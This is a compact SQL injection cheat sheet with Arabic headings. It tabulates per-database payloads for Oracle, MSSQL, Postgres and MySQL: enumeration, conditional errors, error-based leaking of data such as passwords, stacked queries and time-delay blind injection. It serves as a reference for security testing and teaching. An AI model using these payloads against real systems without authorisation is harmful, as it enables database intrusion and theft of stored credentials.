SQL Injection Master Cheat Sheet

الدليل المرجعي التفاعلي المتقدم المعتمد عالمياً لجميع استعلامات وثغرات SQL Injection عبر مختلف قواعد البيانات.

1. String Concatenation (دمج النصوص)

DB EngineSyntax Payload
ORACLE'foo'||'bar'
MSSQL'foo'+'bar'
POSTGRES'foo'||'bar'
MYSQLCONCAT('foo','bar') OR 'foo' 'bar'

2. Substring Extraction (استخراج الحروف والأجزاء)

DB EngineSyntax Payload
ORACLESUBSTR('foobar', 4, 2)
MSSQLSUBSTRING('foobar', 4, 2)
POSTGRESSUBSTRING('foobar', 4, 2)
MYSQLSUBSTRING('foobar', 4, 2)

3. Inline & Block Comments (إبطال باقي الاستعلام)

DB EngineSyntax Payload
ORACLE--comment
MSSQL--comment OR /*comment*/
POSTGRES--comment OR /*comment*/
MYSQL#comment OR -- comment OR /*comment*/

4. Database Version (فحص نوع وإصدار السيرفر)

DB EngineVersion Query Payload
ORACLESELECT banner FROM v$version OR SELECT version FROM v$instance
MSSQLSELECT @@version
POSTGRESSELECT version()
MYSQLSELECT @@version

5. Database Contents (استكشاف الجداول والأعمدة)

DB EngineSchema Enumeration Query
ORACLESELECT * FROM all_tables OR SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
MSSQLSELECT * FROM information_schema.tables OR SELECT * FROM information_schema.columns WHERE table_name = 'USERS'
POSTGRESSELECT * FROM information_schema.tables OR SELECT * FROM information_schema.columns WHERE table_name = 'USERS'
MYSQLSELECT * FROM information_schema.tables OR SELECT * FROM information_schema.columns WHERE table_name = 'USERS'

6. Conditional Errors (إحداث أخطاء شرطية متعمدة)

DB EngineError Trigger Payload
ORACLESELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
MSSQLSELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
POSTGRES1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
MYSQLSELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')

7. Visible Error Data Exfiltration (تسريب البيانات عبر رسائل النظام)

DB EngineExploit Payload & Leaked Output Example
MSSQLSELECT 'foo' WHERE 1 = (SELECT 'secret')
> Conversion failed when converting the varchar value 'secret' to data type int.
POSTGRESSELECT CAST((SELECT password FROM users LIMIT 1) AS int)
> invalid input syntax for integer: "secret"
MYSQLSELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
> XPATH syntax error: '\secret'

8. Batched (Stacked) Queries (الاستعلامات المتعددة المتتالية)

DB EngineSyntax Payload
ORACLEDoes not support batched queries.
MSSQLQUERY-1-HERE; QUERY-2-HERE
POSTGRESQUERY-1-HERE; QUERY-2-HERE
MYSQLQUERY-1-HERE; QUERY-2-HERE (Supported in PHP mysqli / Python multi-query APIs)

9 & 10. Time Delays & Conditional Delays (التأخير الوقتي والشرطي)

DB EngineUnconditional Sleep PayloadConditional Sleep Payload
ORACLEdbms_pipe.receive_message(('a'),10)SELECT CASE WHEN (CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
MSSQLWAITFOR DELAY '0:0:10'IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
POSTGRESSELECT pg_sleep(10)SELECT CASE WHEN (CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END
MYSQLSELECT SLEEP(10)SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
